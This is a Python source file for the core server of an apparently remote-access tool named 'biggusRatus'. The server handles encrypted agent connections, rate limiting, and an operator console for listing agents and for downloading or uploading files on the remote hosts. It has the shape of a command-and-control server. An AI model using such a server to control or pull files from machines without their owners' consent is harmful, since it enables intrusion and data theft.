# Core server implementation.

import base64
import json
import logging
import os
import queue
import select
import socket
import sys
import threading
import time
import uuid
from collections import defaultdict
from typing import Any, Dict, List, Optional, Set, Tuple

from common.constants import (
    DEFAULT_HOST,
    DEFAULT_PORT,
    DOWNLOAD_ACTION,
    HANDSHAKE_ACTION,
    MAX_CONNECTIONS_PER_IP_PER_MINUTE,
    MAX_CONCURRENT_CONNECTIONS_PER_IP,
    MAX_FILE_SIZE_BYTES,
    MAX_TOTAL_CONNECTIONS,
    PROTOCOL_VERSION,
    RATE_LIMIT_BAN_SECONDS,
    READ_TIMEOUT_SEC,
    SOCKET_TIMEOUT_SEC,
    TEST_ACTION,
    UPLOAD_ACTION,
)
from common.protocol import (
    build_command,
    build_handshake_response,
    build_success_response,
    decode_message,
    encode_message,
    extract_os_info_from_handshake,
    extract_dh_public_key_from_handshake_command,
    sign_message,
    verify_message,
)
from common.tcp import ProtocolError, recv_frame, send_frame
from common.crypto import Encryptor, CryptoError
from common.key_exchange import ECDHExchange, KeyExchangeError
from common.hmac import MessageAuthenticator, HmacError
from server.output import OutputFormatter
from server.session import AgentSession
from server.path_security import validate_local_path, PathSecurityError

# Lock to synchronize prompt display with logging output
_prompt_lock = threading.Lock()

logger = logging.getLogger(__name__)


class RateLimiter:
    # Thread-safe rate limiter to protect against connection flooding and DoS attacks.
    # Tracks connections per IP and enforces limits on connection rate and concurrency.

    def __init__(
        self,
        max_connections_per_ip_per_minute: int = MAX_CONNECTIONS_PER_IP_PER_MINUTE,
        max_concurrent_per_ip: int = MAX_CONCURRENT_CONNECTIONS_PER_IP,
        max_total_connections: int = MAX_TOTAL_CONNECTIONS,
        ban_duration_seconds: int = RATE_LIMIT_BAN_SECONDS,
    ):
        self.max_connections_per_ip_per_minute = max_connections_per_ip_per_minute
        self.max_concurrent_per_ip = max_concurrent_per_ip
        self.max_total_connections = max_total_connections
        self.ban_duration_seconds = ban_duration_seconds
        self._lock = threading.RLock()  # Use RLock to allow nested calls like is_banned() from try_accept()
        # IP -> list of connection timestamps
        self._connection_history: Dict[str, List[float]] = defaultdict(list)
        # IP -> count of active connections
        self._active_connections: Dict[str, int] = defaultdict(int)
        # IP -> ban expiry timestamp
        self._banned_ips: Dict[str, float] = {}
        # Total active connections
        self._total_active = 0

    def is_banned(self, ip: str) -> bool:
        # Check if an IP is currently banned.
        with self._lock:
            ban_expiry = self._banned_ips.get(ip)
            if ban_expiry is None:
                return False
            if time.time() > ban_expiry:
                del self._banned_ips[ip]
                return False
            return True

    def _cleanup_old_connections(self, ip: str) -> None:
        # Remove connection records older than 60 seconds.
        cutoff = time.time() - 60.0
        self._connection_history[ip] = [
            t for t in self._connection_history[ip] if t > cutoff
        ]

    def try_accept(self, ip: str) -> Tuple[bool, str]:
        # Attempt to accept a new connection from the given IP.
        # Returns (allowed, reason) where reason explains rejection if not allowed.
        with self._lock:
            # Check if IP is banned
            if self.is_banned(ip):
                return False, "IP is temporarily banned due to rate limiting"

            # Clean up old connection records
            self._cleanup_old_connections(ip)

            # Check per-IP connection rate
            recent_count = len(self._connection_history[ip])
            if recent_count >= self.max_connections_per_ip_per_minute:
                self._ban_ip(ip)
                return False, f"Too many connections from {ip} (rate limit exceeded)"

            # Check per-IP concurrent connections
            if self._active_connections[ip] >= self.max_concurrent_per_ip:
                return False, f"Too many concurrent connections from {ip}"

            # Check total connections
            if self._total_active >= self.max_total_connections:
                return False, "Server at maximum capacity"

            # Record the connection
            self._connection_history[ip].append(time.time())
            self._active_connections[ip] += 1
            self._total_active += 1
            return True, ""

    def release(self, ip: str) -> None:
        # Release a connection slot for the given IP.
        with self._lock:
            if self._active_connections[ip] > 0:
                self._active_connections[ip] -= 1
            if self._total_active > 0:
                self._total_active -= 1

    def _ban_ip(self, ip: str) -> None:
        # Ban an IP for the configured duration.
        self._banned_ips[ip] = time.time() + self.ban_duration_seconds
        logger.warning(f"Banned IP {ip} for {self.ban_duration_seconds} seconds due to rate limiting")

    def unban_ip(self, ip: str) -> bool:
        # Manually unban an IP. Returns True if IP was banned.
        with self._lock:
            if ip in self._banned_ips:
                del self._banned_ips[ip]
                return True
            return False

    def get_stats(self) -> Dict[str, Any]:
        # Get current rate limiter statistics.
        with self._lock:
            # Clean up expired bans
            now = time.time()
            expired_bans = [ip for ip, expiry in self._banned_ips.items() if now > expiry]
            for ip in expired_bans:
                del self._banned_ips[ip]

            return {
                "total_active_connections": self._total_active,
                "max_total_connections": self.max_total_connections,
                "banned_ips": list(self._banned_ips.keys()),
                "unique_ips_connected": len(self._active_connections),
                "max_connections_per_ip_per_minute": self.max_connections_per_ip_per_minute,
                "max_concurrent_per_ip": self.max_concurrent_per_ip,
                "ban_duration_seconds": self.ban_duration_seconds,
            }


class Server:
    # Main server class handling agent connections and commands.

    def __init__(
        self,
        host: str = DEFAULT_HOST,
        port: int = DEFAULT_PORT,
        max_file_size: int = MAX_FILE_SIZE_BYTES
    ) -> None:
        self.host = host
        self.port = port
        self.max_file_size = max_file_size
        self.socket: Optional[socket.socket] = None
        self.running = False
        self.sessions: Dict[str, AgentSession] = {}
        self.lock = threading.Lock()
        self._accept_thread: Optional[threading.Thread] = None
        self.selected_agent_id: Optional[str] = None
        self._response_waiters: Dict[str, "queue.Queue[Dict[str, Any]]"] = {}
        self._response_lock = threading.Lock()
        self._rate_limiter = RateLimiter()

    def start(self) -> None:
        listen_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listen_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listen_sock.bind((self.host, self.port))
        listen_sock.listen()
        listen_sock.settimeout(0.5)  # Allow accept() to periodically check self.running
        self.socket = listen_sock
        self.running = True
        self._accept_thread = threading.Thread(
            target=self._accept_connections, name="server-accept", daemon=True
        )
        self._accept_thread.start()
        bound = listen_sock.getsockname()
        logger.info(f"Server started on {bound[0]}:{bound[1]}")

    def _accept_connections(self) -> None:
        assert self.socket is not None
        while self.running:
            try:
                client_socket, address = self.socket.accept()
            except socket.timeout:
                # Timeout is expected - loop back to check self.running
                continue
            except OSError:
                break

            ip = address[0]

            # Check rate limiting
            allowed, reason = self._rate_limiter.try_accept(ip)
            if not allowed:
                logger.warning(f"Connection rejected from {ip}: {reason}")
                try:
                    client_socket.close()
                except OSError:
                    pass
                continue

            agent_id = str(uuid.uuid4())
            logger.info(
                f"New TCP connection from {address[0]}:{address[1]} "
                f"(agent_id={agent_id})"
            )
            client_socket.settimeout(SOCKET_TIMEOUT_SEC)
            session = AgentSession(agent_id, address)
            session.socket = client_socket
            with self.lock:
                self.sessions[agent_id] = session
            thread = threading.Thread(
                target=self._handle_agent,
                args=(client_socket, address, agent_id),
                name=f"agent-{agent_id[:8]}",
                daemon=True,
            )
            thread.start()

    def _handle_agent(
        self,
        client_socket: socket.socket,
        address: Tuple[str, int],
        agent_id: str,
    ) -> None:
        try:
            encryptor, os_info, hmac_key = self._perform_handshake(client_socket)
            with self.lock:
                session = self.sessions.get(agent_id)
                if session:
                    session.encryptor = encryptor
                    if hmac_key:
                        session.authenticator = MessageAuthenticator(hmac_key)
                    if os_info:
                        session.set_os_info(os_info)
                    session.update_last_seen()
            os_type = os_info.get("os_type", "unknown") if os_info else "unknown"
            logger.info(
                f"Handshake complete for agent {agent_id} "
                f"({address[0]}:{address[1]}) - OS: {os_type}"
            )
            self._agent_message_loop(client_socket, agent_id)
        except socket.timeout as exc:
            logger.warning(
                f"Agent {agent_id} ({address[0]}:{address[1]}) timed out: {exc}"
            )
        except (
            ConnectionError,
            OSError,
            ProtocolError,
            ValueError,
            json.JSONDecodeError,
            CryptoError,
            KeyExchangeError,
            HmacError,
        ) as exc:
            logger.warning(
                f"Agent {agent_id} ({address[0]}:{address[1]}) disconnected: {exc}"
            )
        except Exception:
            logger.exception(
                f"Unexpected error handling agent {agent_id} "
                f"({address[0]}:{address[1]})"
            )
        finally:
            try:
                client_socket.close()
            except OSError:
                pass
            self._rate_limiter.release(address[0])
            with self.lock:
                self.sessions.pop(agent_id, None)
                if self.selected_agent_id == agent_id:
                    self.selected_agent_id = None
            logger.info(f"Agent session closed: {agent_id}")

    def _perform_handshake(
        self, client_socket: socket.socket
    ) -> Tuple[Encryptor, Optional[Dict[str, Any]], Optional[bytes]]:
        raw = recv_frame(client_socket)
        message = decode_message(raw)
        self._validate_handshake_request(message)
        request_id = str(message.get("id", ""))
        os_info = extract_os_info_from_handshake(message)

        # Extract client's DH public key
        client_dh_public = extract_dh_public_key_from_handshake_command(message)

        if client_dh_public:
            # Perform ECDH key exchange
            ecdh_exchange = ECDHExchange()
            server_dh_public = ecdh_exchange.generate_keypair()
            shared_secret = ecdh_exchange.compute_shared_key(client_dh_public)
            encryptor = Encryptor.from_shared_secret(shared_secret)
            logger.debug("Secure ECDH key exchange completed")
        else:
            # Fallback: generate random key (client won't be able to communicate)
            # This maintains protocol compatibility but rejects unencrypted handshakes
            raise ValueError("Client must support ECDH key exchange")

        response = build_handshake_response(request_id, dh_public_key=server_dh_public)
        send_frame(client_socket, encode_message(response))
        return encryptor, os_info, encryptor.hmac_key

    @staticmethod
    def _validate_handshake_request(message: Dict[str, Any]) -> None:
        if message.get("version") != PROTOCOL_VERSION:
            raise ValueError("Invalid or unsupported protocol version")
        if message.get("type") != "command":
            raise ValueError("Handshake must be a command message")
        if message.get("action") != HANDSHAKE_ACTION:
            raise ValueError("First message must be handshake command")

    def _handle_agent_incoming(
        self, client_socket: socket.socket, agent_id: str, message: Dict[str, Any]
    ) -> None:
        with self.lock:
            session = self.sessions.get(agent_id)
            encryptor = session.encryptor if session else None
            authenticator = session.authenticator if session else None
        
        if message.get("type") == "response":
            if authenticator and not verify_message(message, authenticator):
                logger.error(
                    f"HMAC verification failed for response from agent {agent_id}"
                )
                return
            rid = str(message.get("id", ""))
            with self._response_lock:
                waiter = self._response_waiters.pop(rid, None)
            if waiter is not None:
                waiter.put(message)
                return
            logger.info(f"Received response from agent {agent_id}: {message}")
            return
        if message.get("type") == "command" and message.get("action") == TEST_ACTION:
            if authenticator and not verify_message(message, authenticator):
                logger.error(
                    f"HMAC verification failed for command from agent {agent_id}"
                )
                return
            if authenticator:
                logger.debug(f"HMAC verified for command from agent {agent_id}")
            
            logger.info(f"Received command from agent {agent_id}: {message}")
            req_id = str(message.get("id", ""))
            reply = build_success_response(
                req_id, TEST_ACTION, payload='{"ok":true}', message="test-ok"
            )
            
            # Sign the response if we have an authenticator
            if authenticator:
                reply = sign_message(reply, authenticator)
            
            plaintext = encode_message(reply)
            if encryptor is not None:
                ciphertext = encryptor.encrypt(plaintext)
            else:
                ciphertext = plaintext
            send_frame(client_socket, ciphertext)
            return
        logger.warning(f"Unhandled message from agent {agent_id}: {message}")

    def _agent_message_loop(self, client_socket: socket.socket, agent_id: str) -> None:
        while self.running:
            try:
                ciphertext = recv_frame(client_socket)
                if not self.running:
                    break
                with self.lock:
                    session = self.sessions.get(agent_id)
                    if session and session.encryptor:
                        plaintext = session.decrypt_data(ciphertext)
                    else:
                        plaintext = ciphertext
                message = decode_message(plaintext)
                with self.lock:
                    session = self.sessions.get(agent_id)
                    if session:
                        session.update_last_seen()
                self._handle_agent_incoming(client_socket, agent_id, message)
            except socket.timeout:
                idle_timeout: Optional[float] = None
                with self.lock:
                    session = self.sessions.get(agent_id)
                    if session:
                        current_idle = session.idle_time
                        if current_idle > READ_TIMEOUT_SEC:
                            idle_timeout = current_idle
                if idle_timeout is not None:
                    logger.warning(
                        f"Agent {agent_id} idle timeout ({idle_timeout:.1f}s)"
                    )
                    raise
                continue
            except CryptoError as exc:
                logger.error(f"Agent {agent_id} decryption error: {exc}")
                raise

    def send_test_to_agent(self, agent_id: str) -> None:
        with self.lock:
            session = self.sessions.get(agent_id)
            sock = session.socket if session else None
            encryptor = session.encryptor if session else None
            authenticator = session.authenticator if session else None
        if sock is None:
            logger.error(f"No such agent: {agent_id}")
            return
        cmd = build_command(TEST_ACTION, {})
        
        # Sign the command if we have an authenticator
        if authenticator:
            cmd = sign_message(cmd, authenticator)
        
        request_id = str(cmd["id"])
        waiter: queue.Queue[Dict[str, Any]] = queue.Queue(maxsize=1)
        with self._response_lock:
            self._response_waiters[request_id] = waiter
        try:
            plaintext = encode_message(cmd)
            if encryptor is not None:
                ciphertext = encryptor.encrypt(plaintext)
            else:
                ciphertext = plaintext
            send_frame(sock, ciphertext)
            response = waiter.get(timeout=30.0)
            # HMAC was verified in _handle_agent_incoming before the response was queued.

            with self.lock:
                session = self.sessions.get(agent_id)
                if session:
                    session.update_last_seen()
            logger.info(f"Test round-trip OK from {agent_id}: {response}")
        except queue.Empty:
            logger.error(f"Timed out waiting for test response from {agent_id}")
        finally:
            with self._response_lock:
                self._response_waiters.pop(request_id, None)

    def send_command_to_agent(self, agent_id: str, action: str, params: Dict[str, Any], timeout: float = 30.0) -> Dict[str, Any]:
        with self.lock:
            session = self.sessions.get(agent_id)
            sock = session.socket if session else None
            encryptor = session.encryptor if session else None
            authenticator = session.authenticator if session else None
        if sock is None:
            return {"success": False, "error": f"No such agent: {agent_id}"}
        cmd = build_command(action, params)
        if authenticator:
            cmd = sign_message(cmd, authenticator)
        request_id = str(cmd["id"])
        waiter: queue.Queue[Dict[str, Any]] = queue.Queue(maxsize=1)
        with self._response_lock:
            self._response_waiters[request_id] = waiter
        try:
            plaintext = encode_message(cmd)
            if encryptor is not None:
                ciphertext = encryptor.encrypt(plaintext)
            else:
                ciphertext = plaintext
            send_frame(sock, ciphertext)
            response = waiter.get(timeout=timeout)
            with self.lock:
                session = self.sessions.get(agent_id)
                if session:
                    session.update_last_seen()
            data = response.get("data", {})
            payload = data.get("payload", "{}")
            try:
                return json.loads(payload)
            except json.JSONDecodeError:
                return {"success": False, "error": "Invalid response payload"}
        except queue.Empty:
            return {"success": False, "error": "Timeout waiting for response"}
        except Exception as e:
            return {"success": False, "error": str(e)}
        finally:
            with self._response_lock:
                self._response_waiters.pop(request_id, None)

    def download_from_agent(
        self, agent_id: str, remote_path: str, local_path: str
    ) -> bool:
        # Download a file from an agent and save it locally.
        with self.lock:
            session = self.sessions.get(agent_id)
            sock = session.socket if session else None
            encryptor = session.encryptor if session else None
            authenticator = session.authenticator if session else None
        if sock is None:
            logger.error(f"No such agent: {agent_id}")
            return False

        # Validate local path to prevent traversal attacks
        try:
            # Resolve to absolute path and ensure parent directory is valid
            safe_local_path = validate_local_path(local_path, allow_absolute=True)
        except PathSecurityError as e:
            logger.error(f"Invalid local path: {e}")
            return False

        cmd = build_command(DOWNLOAD_ACTION, {"remote_path": remote_path})
        
        # Sign the command if we have an authenticator
        if authenticator:
            cmd = sign_message(cmd, authenticator)
        
        request_id = str(cmd["id"])
        waiter: queue.Queue[Dict[str, Any]] = queue.Queue(maxsize=1)
        with self._response_lock:
            self._response_waiters[request_id] = waiter
        try:
            plaintext = encode_message(cmd)
            if encryptor is not None:
                ciphertext = encryptor.encrypt(plaintext)
            else:
                ciphertext = plaintext
            send_frame(sock, ciphertext)

            response = waiter.get(timeout=120.0)
            # HMAC was verified in _handle_agent_incoming before the response was queued.

            with self.lock:
                session = self.sessions.get(agent_id)
                if session:
                    session.update_last_seen()

            data = response.get("data", {})
            payload = data.get("payload", "{}")
            try:
                result = json.loads(payload)
            except json.JSONDecodeError:
                logger.error("Invalid response payload")
                return False

            if not result.get("success", False):
                logger.error(f"Download failed: {result.get('error', 'Unknown error')}")
                return False

            content_base64 = result.get("content", "")
            if not content_base64:
                logger.error("No file content in response")
                return False

            # Estimate decoded size before decoding to prevent memory exhaustion
            # base64 encoding increases size by ~33%, so decoded size is ~3/4 of encoded
            estimated_size = len(content_base64) * 3 // 4
            if estimated_size > self.max_file_size:
                logger.error(
                    f"File too large: {estimated_size} bytes (max: {self.max_file_size}). "
                    f"Rejecting download from agent {agent_id}"
                )
                return False

            file_content = base64.b64decode(content_base64)
            file_size = len(file_content)

            # Create parent directory if needed
            parent_dir = os.path.dirname(safe_local_path)
            if parent_dir:
                os.makedirs(parent_dir, exist_ok=True)

            with open(safe_local_path, "wb") as f:
                f.write(file_content)

            logger.info(
                f"Downloaded {remote_path} -> {safe_local_path} ({file_size} bytes) "
                f"from {agent_id}"
            )
            return True

        except queue.Empty:
            logger.error(f"Timed out waiting for download response from {agent_id}")
            return False
        except Exception as e:
            logger.error(f"Download error: {e}")
            return False
        finally:
            with self._response_lock:
                self._response_waiters.pop(request_id, None)

    def upload_to_agent(
        self, agent_id: str, local_path: str, remote_path: str
    ) -> bool:
        # Upload a file from local system to an agent.
        with self.lock:
            session = self.sessions.get(agent_id)
            sock = session.socket if session else None
            encryptor = session.encryptor if session else None
            authenticator = session.authenticator if session else None
        if sock is None:
            logger.error(f"No such agent: {agent_id}")
            return False

        # Validate local path to prevent traversal attacks
        try:
            safe_local_path = validate_local_path(
                local_path,
                allow_absolute=True,
                must_exist=True
            )
        except PathSecurityError as e:
            logger.error(f"Invalid local path: {e}")
            return False

        if not os.path.isfile(safe_local_path):
            logger.error(f"Not a file: {safe_local_path}")
            return False

        # Check file size before reading to prevent memory exhaustion
        try:
            file_size = os.path.getsize(safe_local_path)
        except OSError as e:
            logger.error(f"Cannot get file size: {e}")
            return False

        if file_size > self.max_file_size:
            logger.error(
                f"File too large: {file_size} bytes (max: {self.max_file_size}). "
                f"Rejecting upload to agent {agent_id}"
            )
            return False

        try:
            with open(safe_local_path, "rb") as f:
                file_content = f.read()
            content_base64 = base64.b64encode(file_content).decode("utf-8")

            logger.info(f"Uploading {safe_local_path} ({file_size} bytes) to agent {agent_id}")

            cmd = build_command(UPLOAD_ACTION, {
                "remote_path": remote_path,
                "content": content_base64
            })
            
            # Sign the command if we have an authenticator
            if authenticator:
                cmd = sign_message(cmd, authenticator)
            
            request_id = str(cmd["id"])
            waiter: queue.Queue[Dict[str, Any]] = queue.Queue(maxsize=1)
            with self._response_lock:
                self._response_waiters[request_id] = waiter

            plaintext = encode_message(cmd)
            if encryptor is not None:
                ciphertext = encryptor.encrypt(plaintext)
            else:
                ciphertext = plaintext
            send_frame(sock, ciphertext)

            response = waiter.get(timeout=120.0)
            # HMAC was verified in _handle_agent_incoming before the response was queued.

            with self.lock:
                session = self.sessions.get(agent_id)
                if session:
                    session.update_last_seen()

            data = response.get("data", {})
            payload = data.get("payload", "{}")
            try:
                result = json.loads(payload)
            except json.JSONDecodeError:
                logger.error("Invalid response payload")
                return False

            if not result.get("success", False):
                logger.error(f"Upload failed: {result.get('error', 'Unknown error')}")
                return False

            logger.info(
                f"Uploaded {safe_local_path} -> {remote_path} ({file_size} bytes) "
                f"to {agent_id}"
            )
            return True

        except queue.Empty:
            logger.error(f"Timed out waiting for upload response from {agent_id}")
            return False
        except Exception as e:
            logger.error(f"Upload error: {e}")
            return False
        finally:
            with self._response_lock:
                self._response_waiters.pop(request_id, None)

    @staticmethod
    def _print_help() -> None:
        # Display available server commands.
        print("\nAvailable commands:")
        print("  help                           Display available commands")
        print("  list                           Show all connected agents")
        print("  select <agent_id>              Select agent for interaction")
        print("  test                           Send test command to selected agent")
        print("  download <remote> <local>      Download file from agent")
        print("  upload <local> <remote>        Upload file to agent")
        print("  configure <setting> <value>    Configure server settings")
        print("  stats                          Show rate limiter statistics")
        print("  unban <ip>                     Remove IP from rate limit ban")
        print("  exit                           Disconnect selected agent")
        print("  quit                           Shutdown server")
        print("\nConfigurable settings:")
        print("  max_file_size_in_bytes           Max file size for transfers")
        print("  max_connections_per_ip_per_minute  Connection rate limit per IP")
        print("  max_concurrent_connections_per_ip  Max concurrent connections per IP")
        print("  max_total_connections            Max total concurrent connections")
        print("  rate_limit_ban_seconds           Duration to ban IPs after rate limit")
        print()

    def _get_prompt(self) -> str:
        # Generate the command prompt with context.
        with self.lock:
            session_count = len(self.sessions)
            selected = self.selected_agent_id
        if selected:
            short_id = selected[:8]
            return f"biggusRatus[{short_id}]> "
        return f"biggusRatus[{session_count}]> "

    def _print_output(self, text: str) -> None:
        # Print output and restore prompt.
        with _prompt_lock:
            print(f"\r\033[K{text}")
            if self.running:
                prompt = self._get_prompt()
                print(prompt, end="", flush=True)

    def _print_help_with_prompt(self) -> None:
        # Display help and restore prompt.
        lines = [
            "\nAvailable commands:",
            "  help                           Display available commands",
            "  list                           Show all connected agents",
            "  select <agent_id>              Select agent for interaction",
            "  test                           Send test command to selected agent",
            "  download <remote> <local>      Download file from agent",
            "  upload <local> <remote>        Upload file to agent",
            "  configure <setting> <value>    Configure server settings",
            "  stats                          Show rate limiter statistics",
            "  unban <ip>                     Remove IP from rate limit ban",
            "  exit                           Disconnect selected agent",
            "  quit                           Shutdown server",
            "\nConfigurable settings:",
            "  max_file_size_in_bytes           Max file size for transfers",
            "  max_connections_per_ip_per_minute  Connection rate limit per IP",
            "  max_concurrent_connections_per_ip  Max concurrent connections per IP",
            "  max_total_connections            Max total concurrent connections",
            "  rate_limit_ban_seconds           Duration to ban IPs after rate limit",
            ""
        ]
        self._print_output("\n".join(lines))

    def run_interactive(self, wakeup_fd: Optional[int] = None) -> None:
        OutputFormatter.info("Server ready. Type 'help' for commands.")
        while self.running:
            try:
                # Wait for input availability without holding the lock
                while self.running:
                    read_fds = [sys.stdin]
                    if wakeup_fd is not None:
                        read_fds.append(wakeup_fd)
                    if select.select(read_fds, [], [], 0.1)[0]:
                        # Drain wakeup pipe if it was signaled
                        if wakeup_fd is not None:
                            try:
                                os.read(wakeup_fd, 1024)
                            except OSError:
                                pass
                        break
                
                if not self.running:
                    break

                # Print prompt with lock, then release before blocking on input
                with _prompt_lock:
                    prompt = self._get_prompt()
                    print(prompt, end="", flush=True)

                line = sys.stdin.readline()
                if not line:
                    break
                line = line.strip()
            except (EOFError, KeyboardInterrupt):
                break
            if not line:
                continue
            parts = line.split(maxsplit=1)
            cmd = parts[0].lower()
            arg = parts[1] if len(parts) > 1 else ""
            if cmd == "help":
                self._print_help_with_prompt()
            elif cmd == "list":
                with self.lock:
                    sessions = list(self.sessions.values())
                    selected = self.selected_agent_id
                self._print_output(OutputFormatter.format_session_table(sessions, selected))
            elif cmd == "select":
                if not arg:
                    self._print_output(f"[{OutputFormatter.timestamp()}] [!] Usage: select <agent_id>")
                    continue
                with self.lock:
                    if arg not in self.sessions:
                        self._print_output(f"[{OutputFormatter.timestamp()}] [!] Unknown agent: {arg}")
                        continue
                    self.selected_agent_id = arg
                self._print_output(f"[{OutputFormatter.timestamp()}] [+] Selected agent {arg[:8]}...")
            elif cmd == "test":
                target = self.selected_agent_id
                if target is None:
                    self._print_output(f"[{OutputFormatter.timestamp()}] [!] Select an agent first: select <agent_id>")
                    continue
                self.send_test_to_agent(target)
            elif cmd == "download":
                target = self.selected_agent_id
                if target is None:
                    self._print_output(f"[{OutputFormatter.timestamp()}] [!] Select an agent first: select <agent_id>")
                    continue
                args = arg.split(maxsplit=1)
                if len(args) < 2:
                    self._print_output(f"[{OutputFormatter.timestamp()}] [!] Usage: download <remote_path> <local_path>")
                    continue
                remote_path, local_path = args[0], args[1]
                self._print_output(f"[{OutputFormatter.timestamp()}] Downloading {remote_path} -> {local_path}...")
                success = self.download_from_agent(target, remote_path, local_path)
                if success:
                    self._print_output(f"[{OutputFormatter.timestamp()}] [+] Downloaded {remote_path} -> {local_path}")
                else:
                    self._print_output(f"[{OutputFormatter.timestamp()}] [!] Failed to download {remote_path}")
            elif cmd == "upload":
                target = self.selected_agent_id
                if target is None:
                    self._print_output(f"[{OutputFormatter.timestamp()}] [!] Select an agent first: select <agent_id>")
                    continue
                args = arg.split(maxsplit=1)
                if len(args) < 2:
                    self._print_output(f"[{OutputFormatter.timestamp()}] [!] Usage: upload <local_path> <remote_path>")
                    continue
                local_path, remote_path = args[0], args[1]
                self._print_output(f"[{OutputFormatter.timestamp()}] Uploading {local_path} -> {remote_path}...")
                success = self.upload_to_agent(target, local_path, remote_path)
                if success:
                    self._print_output(f"[{OutputFormatter.timestamp()}] [+] Uploaded {local_path} -> {remote_path}")
                else:
                    self._print_output(f"[{OutputFormatter.timestamp()}] [!] Failed to upload {local_path}")
            elif cmd == "configure":
                args = arg.split(maxsplit=1)
                if len(args) < 2:
                    self._print_output(f"[{OutputFormatter.timestamp()}] [!] Usage: configure <setting> <value>")
                    continue
                setting, value_str = args[0], args[1]
                if setting == "max_file_size_in_bytes":
                    try:
                        new_value = int(value_str)
                        if new_value <= 0:
                            self._print_output(f"[{OutputFormatter.timestamp()}] [!] max_file_size_in_bytes must be a positive integer")
                            continue
                        self.max_file_size = new_value
                        self._print_output(f"[{OutputFormatter.timestamp()}] [+] Set max_file_size_in_bytes to {new_value}")
                    except ValueError:
                        self._print_output(f"[{OutputFormatter.timestamp()}] [!] Invalid value: {value_str}. Must be an integer.")
                elif setting == "max_connections_per_ip_per_minute":
                    try:
                        new_value = int(value_str)
                        if new_value <= 0:
                            self._print_output(f"[{OutputFormatter.timestamp()}] [!] max_connections_per_ip_per_minute must be a positive integer")
                            continue
                        self._rate_limiter.max_connections_per_ip_per_minute = new_value
                        self._print_output(f"[{OutputFormatter.timestamp()}] [+] Set max_connections_per_ip_per_minute to {new_value}")
                    except ValueError:
                        self._print_output(f"[{OutputFormatter.timestamp()}] [!] Invalid value: {value_str}. Must be an integer.")
                elif setting == "max_concurrent_connections_per_ip":
                    try:
                        new_value = int(value_str)
                        if new_value <= 0:
                            self._print_output(f"[{OutputFormatter.timestamp()}] [!] max_concurrent_connections_per_ip must be a positive integer")
                            continue
                        self._rate_limiter.max_concurrent_per_ip = new_value
                        self._print_output(f"[{OutputFormatter.timestamp()}] [+] Set max_concurrent_connections_per_ip to {new_value}")
                    except ValueError:
                        self._print_output(f"[{OutputFormatter.timestamp()}] [!] Invalid value: {value_str}. Must be an integer.")
                elif setting == "max_total_connections":
                    try:
                        new_value = int(value_str)
                        if new_value <= 0:
                            self._print_output(f"[{OutputFormatter.timestamp()}] [!] max_total_connections must be a positive integer")
                            continue
                        self._rate_limiter.max_total_connections = new_value
                        self._print_output(f"[{OutputFormatter.timestamp()}] [+] Set max_total_connections to {new_value}")
                    except ValueError:
                        self._print_output(f"[{OutputFormatter.timestamp()}] [!] Invalid value: {value_str}. Must be an integer.")
                elif setting == "rate_limit_ban_seconds":
                    try:
                        new_value = int(value_str)
                        if new_value < 0:
                            self._print_output(f"[{OutputFormatter.timestamp()}] [!] rate_limit_ban_seconds must be a non-negative integer")
                            continue
                        self._rate_limiter.ban_duration_seconds = new_value
                        self._print_output(f"[{OutputFormatter.timestamp()}] [+] Set rate_limit_ban_seconds to {new_value}")
                    except ValueError:
                        self._print_output(f"[{OutputFormatter.timestamp()}] [!] Invalid value: {value_str}. Must be an integer.")
                else:
                    self._print_output(f"[{OutputFormatter.timestamp()}] [!] Unknown setting: {setting}")
            elif cmd == "stats":
                stats = self._rate_limiter.get_stats()
                lines = [
                    "\nRate Limiter Statistics:",
                    f"  Active connections: {stats['total_active_connections']}/{stats['max_total_connections']}",
                    f"  Unique IPs connected: {stats['unique_ips_connected']}",
                    f"  Banned IPs: {len(stats['banned_ips'])}",
                ]
                if stats['banned_ips']:
                    lines.append(f"    {', '.join(stats['banned_ips'])}")
                lines.extend([
                    "\nLimits:",
                    f"  Max connections per IP per minute: {stats['max_connections_per_ip_per_minute']}",
                    f"  Max concurrent per IP: {stats['max_concurrent_per_ip']}",
                    f"  Ban duration: {stats['ban_duration_seconds']} seconds",
                    ""
                ])
                self._print_output("\n".join(lines))
            elif cmd == "unban":
                if not arg:
                    self._print_output(f"[{OutputFormatter.timestamp()}] [!] Usage: unban <ip>")
                    continue
                if self._rate_limiter.unban_ip(arg):
                    self._print_output(f"[{OutputFormatter.timestamp()}] [+] Unbanned IP: {arg}")
                else:
                    self._print_output(f"[{OutputFormatter.timestamp()}] [?] IP {arg} was not banned")
            elif cmd == "exit":
                if self.selected_agent_id is None:
                    self._print_output(f"[{OutputFormatter.timestamp()}] [?] No agent selected.")
                    continue
                with self.lock:
                    session = self.sessions.pop(self.selected_agent_id, None)
                    sock = session.socket if session else None
                if sock is not None:
                    try:
                        sock.close()
                    except OSError:
                        pass
                self._print_output(f"[{OutputFormatter.timestamp()}] Disconnected agent {self.selected_agent_id[:8]}...")
                self.selected_agent_id = None
            elif cmd == "quit":
                self._print_output(f"[{OutputFormatter.timestamp()}] Shutting down server...")
                break
            else:
                self._print_output(f"[{OutputFormatter.timestamp()}] [!] Unknown command: {cmd}")
                self._print_output("Type 'help' for available commands.")

    def stop(self) -> None:
        self.running = False
        with self.lock:
            for session in list(self.sessions.values()):
                if session.socket:
                    try:
                        session.socket.close()
                    except OSError:
                        pass
            self.sessions.clear()
            self.selected_agent_id = None
        if self.socket:
            try:
                self.socket.close()
            except OSError:
                pass
            self.socket = None
        if self._accept_thread is not None:
            self._accept_thread.join(timeout=0.5)
            self._accept_thread = None
        logger.info("Server stopped")
